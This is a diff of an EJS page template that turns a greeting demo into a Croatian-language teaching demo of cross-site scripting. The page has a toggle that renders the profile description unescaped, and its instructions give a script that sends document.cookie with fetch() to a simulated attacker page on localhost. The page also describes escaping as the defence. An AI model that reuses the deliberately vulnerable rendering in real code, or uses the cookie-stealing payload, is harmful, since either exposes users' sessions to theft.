@@ -1,54 +1,234 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Custom Greeting Demo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- <style>
-    /* Basic styling for responsiveness */
-    body { font-family: Arial, sans-serif; margin: 20px; }
-    .container { max-width: 600px; margin: auto; }
-    .toggle { margin-bottom: 20px; }
-    input[type="text"], textarea { width: 100%; padding: 8px; margin: 5px 0; }
-    button { padding: 10px 15px; }
-  </style> -->
+    <meta charset="UTF-8">
+    <title>Cross-site scripting (XSS)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-  <div class="container">
-    <h1>Custom Greeting Demo</h1>
+    <div class="container">
+        <h1>Primjer Cross-site scripting (XSS) ranjivosti</h1>
+        <div class="xss-toggle-container">
+            <form action="/toggle-xss" method="post" class="toggle">
+                <label id="xssToggleLabel" for="xssToggle">
+                    XSS ranjivost omogućena:
+                </label>
+                <input 
+                    type="checkbox" 
+                    id="xssToggle" 
+                    name="xssToggle"
+                    <% if (xssVulnerabilityEnabled) { %>checked<% } %>
+                    onchange="this.form.submit()"
+                >
+            </form>
+        </div>
+        <div class="center-container">
+            <div class="profile-container">
+                <% if (!isAuthenticated) { %>
+                    <!-- Login Form -->
+                    <h2>Prijava</h2>
+                    <form action="/login" method="post">
+                        <label for="username">Korisničko ime:</label>
+                        <input 
+                            type="text" 
+                            id="username" 
+                            name="username" 
+                            required
+                        >
+                        <button type="submit">Prijavi se</button>
+                    </form>
+                <% } else { %>
+                    <!-- Description -->
+                    <h1>Korisnički profil</h1>
+                    <h2>Korisničko ime: <%= username %></h2>
+                    <% if (profileDescription) { %>
+                        <h3>Opis profila:</h3>
+                        <p><%- profileDescription %></p>
+                    <% } %>
+                    <h3>Uredi opis profila:</h3>
+                    <div class="description-container">
+                        <form action="/profileDescription" method="post">
+                            <textarea 
+                                title="Uredi opis profila"
+                                name="profileDescription" 
+                                rows="8" 
+                                required
+                                oninvalid="this.setCustomValidity('Opis profila ne može biti prazan')"
+                                oninput="this.setCustomValidity('')"
+                            ></textarea>
+                            <button class="submit-button" type="submit">Podnesi</button>
+                        </form>
+                    </div>
+                    <form action="/logout" method="post">
+                        <button type="submit">Odjavi se</button>
+                    </form>
+                <% } %>
+            </div>
+            <div class="instructions-container">
+                <h2>Upute za demonstraciju XSS ranjivosti</h2>
+                
+                <div class="instruction-section">
+                    <h3>1. Prijava u sustav</h3>
+                    <p>• Prijavite se koristeći bilo koje korisničko ime</p>
+                    <p class="note">Nakon prijave, vaš session ID će biti pohranjen u kolačiću (cookie)</p>
+                </div>
 
-    <form action="/toggle-xss" method="post" class="toggle">
-      <label for="xssToggle">XSS Vulnerability:</label>
-      <input type="checkbox" id="xssToggle" name="xssToggle"
-        <% if (xssVulnerabilityEnabled) { %>checked<% } %>
-        onchange="this.form.submit()">
-      <span><%= xssVulnerabilityEnabled ? 'Enabled' : 'Disabled' %></span>
-    </form>
+                <div class="instruction-section">
+                    <h3>2. Unos malicioznog koda</h3>
+                    <p>• Kada je XSS ranjivost omogućena, unesite sljedeći kod u polje za opis profila:</p>
+                    <div class="code-block">
+    <pre><code>&lt;script&gt;
+        fetch('http://localhost:3000/mock-hacker-page?message=' + document.cookie);
+    &lt;/script&gt;</code></pre>
+                    </div>
+                </div>
 
-    <% if (!isAuthenticated) { %>
-      <!-- Login Form -->
-      <h2>Login</h2>
-      <form action="/login" method="post">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
-        <button type="submit">Login</button>
-      </form>
-    <% } else { %>
-      <!-- Greeting and Custom Message Form -->
-      <p>Welcome, <%= username %>!</p>
-      <% if (customMessage) { %>
-        <h3>Your Greeting Message:</h3>
-        <p><%- customMessage %></p>
-      <% } %>
-      <h3>Set Your Greeting Message:</h3>
-      <form action="/message" method="post">
-        <textarea name="customMessage" rows="4" required></textarea>
-        <button type="submit">Update Message</button>
-      </form>
-      <form action="/logout" method="post">
-        <button type="submit">Logout</button>
-      </form>
-    <% } %>
-  </div>
+                <div class="instruction-section">
+                    <h3>3. Testiranje ranjivosti</h3>
+                    <p>• Kliknite "Podnesi" za izvršavanje koda</p>
+                    <p>• Posjetite <a href="/mock-hacker-page" class="hacker-link">simuliranu napadačevu stranicu (kliknite ovdje)</a> da vidite ukradene podatke</p>
+                    <p class="note">U stvarnom scenariju, napadačeva stranica bi bila na drugoj domeni</p>
+                </div>
+
+                <div class="instruction-section">
+                    <h3>4. Zaštita od XSS napada</h3>
+                    <p>Aplikacija koristi dvije razine zaštite:</p>
+                    <ul>
+                        <li>Klijentska zaštita: <code>encodeURIComponent()</code></li>
+                        <li>Poslužiteljska zaštita: Escape posebnih znakova (<, >, &, ", ' itd.)</li>
+                    </ul>
+                </div>
+
+                <span>Kad je ranjivost onemogućena, pokušaj ubacivanja malicioznog koda u stranicu bit će spriječen te će se taj kod samo ispisati.</span>
+
+                
+            </div>
+        </div>
+    </div>
+    <script>
+        document.querySelector('form[action="/profileDescription"]').addEventListener("submit", function(e) {
+            const xssEnabled = xssVulnerabilityEnabled === "true";
+
+            if (!xssEnabled) {
+                e.preventDefault();
+                const textAreaComponent = this.querySelector("textarea[name='profileDescription']");
+                textAreaComponent.value = encodeURIComponent(textAreaComponent.value);
+                this.submit();
+            }
+        });
+    </script>
+    <style>
+        body {
+            background-color: #ddedea;
+        }
+        .center-container {
+            position: relative;
+            display: flex;
+            flex-direction: row;
+            gap: 40px;
+        }
+        .xss-toggle-container {
+            display: flex;
+            width: 560px;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+            font-size: 20px;
+            color: red;
+            font-weight: bolder;
+        }
+        .profile-container {
+            position: relative;
+            background-color: #e8dff5;
+            width: 560px;
+            height: fit-content;
+            margin: 10px 0px;
+            padding: 20px;
+            border: 4px solid black;
+        }
+        .description-container {
+            margin: 30px 0px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        .description-container textarea {
+            padding: 8px !important;
+            resize: none;
+            overflow-y: auto;
+            width: 97%;
+            margin-bottom: 5px;
+        }
+        .submit-button {
+            position: absolute;
+            right: -5px;
+            /* bottom: 20px; */
+        }
+
+        /* Instructions Section */
+        .instructions {
+            margin-top: 5px;
+            font-size: 18px;
+            font-style: italic;
+        }
+        .instructions-container {
+            border: 1px solid #2c3e50;
+            background-color: #daeaf6;
+            padding: 20px;
+            margin: 10px 0;
+            max-width: 670px;
+        }
+        
+        .instruction-section {
+            margin: 20px 0;
+            padding-left: 15px;
+            border-left: 3px solid #007bff;
+        }
+        .instruction-section h3 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        .note {
+            color: #666;
+            font-style: italic;
+            margin-left: 20px;
+            font-size: 0.9em;
+        }
+        .code-block {
+            background-color: #2c3e50;
+            color: #fff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            overflow-x: auto;
+        }
+        .code-block pre {
+            margin: 0;
+            white-space: pre-wrap;
+        }
+        .hacker-link {
+            color: #dc3545;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .hacker-link:hover {
+            text-decoration: underline;
+        }
+        .warning-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+        .warning-box h3 {
+            color: #856404;
+            margin-top: 0;
+        }
+        .warning-box ul {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+    </style>
 </body>
 </html>
